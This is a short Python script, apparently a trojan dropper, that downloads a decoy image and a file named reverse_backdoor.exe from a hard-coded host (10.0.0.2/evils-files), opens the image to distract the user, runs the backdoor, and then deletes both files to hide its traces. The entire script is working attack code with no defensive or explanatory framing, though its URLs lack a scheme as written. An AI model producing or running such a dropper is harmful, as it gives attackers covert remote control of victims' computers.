import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("10.0.0.2/evils-files/car.jpg")
networks = subprocess.Popen("car.jpg", shell=True)

download("10.0.0.2/evils-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)


os.remove("car.jpg")
os.remove("reverse_backdoor.exe")